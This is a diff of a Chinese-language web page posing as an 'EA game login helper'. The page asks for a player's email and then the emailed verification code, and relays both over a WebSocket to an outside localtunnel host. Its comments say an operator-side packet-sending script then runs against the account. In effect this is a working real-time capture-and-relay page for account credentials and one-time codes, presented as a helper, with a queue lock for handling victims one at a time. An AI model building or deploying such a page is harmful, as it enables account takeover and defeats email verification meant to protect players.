@@ -1,46 +1,233 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
-  <title>EA游戏登录助手</title>
-  <style>
-    *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
-    body{background:#121212;color:#fff;display:grid;place-items:center;height:100vh;padding:20px}
-    .box{background:#1e1e1e;padding:30px;border-radius:14px;width:100%;max-width:420px}
-    h1{font-size:20px;margin-bottom:20px;text-align:center}
-    input{width:100%;padding:14px;margin:10px 0;background:#2a2a2a;border:none;border-radius:8px;color:#fff;font-size:16px}
-    button{width:100%;padding:14px;background:#007bff;border:none;border-radius:8px;color:#fff;font-size:16px;margin-top:10px;cursor:pointer}
-    #codeBox{display:none}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EA 游戏登录助手</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+        }
+        .container {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            padding: 30px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        h1 {
+            margin-bottom: 30px;
+            font-size: 24px;
+            color: #00d4ff;
+        }
+        input, button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: none;
+            font-size: 16px;
+        }
+        input {
+            background: rgba(255,255,255,0.1);
+            color: #fff;
+            outline: none;
+        }
+        button {
+            background: linear-gradient(90deg, #0078ff, #00d4ff);
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        button:disabled {
+            background: #555;
+            cursor: not-allowed;
+        }
+        .status {
+            margin-top: 20px;
+            color: #aaa;
+        }
+        .hidden {
+            display: none;
+        }
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #fff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
-  <div class="box">
-    <h1>EA游戏登录</h1>
-    <div id="mailBox">
-      <input type="email" id="email" placeholder="输入邮箱" autocomplete="off">
-      <button onclick="sendEmail()">提交邮箱</button>
+    <div class="container">
+        <h1>EA 游戏登录助手</h1>
+        <div id="status" class="status">正在初始化...</div>
+
+        <!-- 排队/等待状态 -->
+        <div id="queueBox">
+            <p>当前系统正在处理上一个请求，请稍候...</p>
+        </div>
+
+        <!-- 邮箱输入界面 -->
+        <div id="mailBox" class="hidden">
+            <input type="email" id="email" placeholder="输入邮箱" autocomplete="off">
+            <button onclick="sendEmail()">提交邮箱</button>
+        </div>
+
+        <!-- 验证码输入界面 -->
+        <div id="codeBox" class="hidden">
+            <input type="text" id="code" placeholder="输入验证码" autocomplete="off">
+            <button onclick="sendCode()">提交验证码</button>
+        </div>
+
+        <!-- 脚本运行中界面 -->
+        <div id="runningBox" class="hidden">
+            <p><span class="spinner"></span>请等待程序正在运行...</p>
+        </div>
+
+        <!-- 完成界面 -->
+        <div id="doneBox" class="hidden">
+            <p>✅ 已运行完成，可以上号了！</p>
+        </div>
     </div>
-    <div id="codeBox">
-      <input type="text" id="code" placeholder="输入验证码" autocomplete="off">
-      <button onclick="sendCode()">提交验证码</button>
-    </div>
-  </div>
 
-  <script>
-    // 这里后面会换成你的穿透地址，现在先空着，用本地地址测试
-    const ws = new WebSocket("wss://soft-carrots-yawn.loca.lt");
+    <script>
+        // ========== 配置项 ==========
+        const WS_URL = "wss://soft-carrots-yawn.loca.lt"; // 你的穿透地址
+        const LOCK_KEY = "ea_login_lock";
+        const LOCK_DURATION = 300000; // 单用户锁定时长（5分钟）
+        // ==========================
 
+        const ws = new WebSocket(WS_URL);
+        let lockInterval = null;
+        let isLocked = false;
 
-    function sendEmail() {
-      const email = document.getElementById("email").value;
-      ws.send(JSON.stringify({type:"email", data:email}));
-      document.getElementById("mailBox").style.display = "none";
-      document.getElementById("codeBox").style.display = "block";
-    }
+        // 状态切换函数
+        function showOnly(boxId) {
+            ['queueBox', 'mailBox', 'codeBox', 'runningBox', 'doneBox'].forEach(id => {
+                document.getElementById(id).classList.add('hidden');
+            });
+            document.getElementById(boxId).classList.remove('hidden');
+        }
 
-    function sendCode() {
-      const code = document.getElementById("code").value;
-      ws.send(JSON.stringify({type:"code", data:code}));
-    }
-  </script>
+        // 初始化锁定状态
+        function checkLock() {
+            const lockTime = localStorage.getItem(LOCK_KEY);
+            if (lockTime && Date.now() - parseInt(lockTime) < LOCK_DURATION) {
+                isLocked = true;
+                showOnly('queueBox');
+                document.getElementById("status").textContent = "⚠️ 系统繁忙，请稍后再试";
+                return false;
+            }
+            return true;
+        }
+
+        // 加锁
+        function acquireLock() {
+            localStorage.setItem(LOCK_KEY, Date.now().toString());
+            isLocked = true;
+        }
+
+        // 解锁
+        function releaseLock() {
+            localStorage.removeItem(LOCK_KEY);
+            isLocked = false;
+        }
+
+        // 连接状态处理
+        ws.onopen = function() {
+            document.getElementById("status").textContent = "✅ 已连接，可正常使用";
+            if (checkLock()) {
+                showOnly('mailBox');
+            }
+        };
+
+        ws.onerror = function() {
+            document.getElementById("status").textContent = "❌ 连接出错，请检查服务和穿透";
+            showOnly('queueBox');
+        };
+
+        ws.onclose = function() {
+            document.getElementById("status").textContent = "⚠️ 连接已断开，请刷新页面";
+            showOnly('queueBox');
+        };
+
+        // 提交邮箱
+        function sendEmail() {
+            const email = document.getElementById("email").value.trim();
+            if (!email) return alert("请输入邮箱");
+            if (isLocked) return;
+
+            // 加锁，防止其他用户进入
+            acquireLock();
+
+            // 发送邮箱到服务端
+            ws.send(JSON.stringify({ type: "email", data: email }));
+
+            // 切换到等待状态，直到服务端确认邮箱已处理
+            document.getElementById("status").textContent = "⏳ 请等待电脑端处理邮箱...";
+            showOnly('queueBox');
+
+            // 监听服务端返回的邮箱处理完成信号
+            ws.onmessage = function(event) {
+                const data = JSON.parse(event.data);
+                if (data.action === "email_done") {
+                    document.getElementById("status").textContent = "✅ 邮箱已处理，请输入验证码";
+                    showOnly('codeBox');
+                } else if (data.action === "script_done") {
+                    // 脚本运行完成
+                    document.getElementById("status").textContent = "✅ 程序运行完成";
+                    showOnly('doneBox');
+                    setTimeout(() => {
+                        releaseLock();
+                        window.location.reload(); // 3秒后刷新页面，放下一个用户
+                    }, 3000);
+                }
+            };
+        }
+
+        // 提交验证码
+        function sendCode() {
+            const code = document.getElementById("code").value.trim();
+            if (!code) return alert("请输入验证码");
+
+            // 发送验证码到服务端
+            ws.send(JSON.stringify({ type: "code", data: code }));
+
+            // 切换到脚本运行状态
+            document.getElementById("status").textContent = "⏳ 请等待程序正在运行...";
+            showOnly('runningBox');
+
+            // 服务端收到验证码后，执行发包脚本，然后发送 "script_done" 信号
+            // 服务端脚本会在发包完成后，向网页发送这个信号，网页收到后自动解锁刷新
+        }
+
+        // 页面关闭/刷新时自动解锁（防止死锁）
+        window.addEventListener('beforeunload', () => {
+            if (isLocked) releaseLock();
+        });
+    </script>
 </body>
+</html>
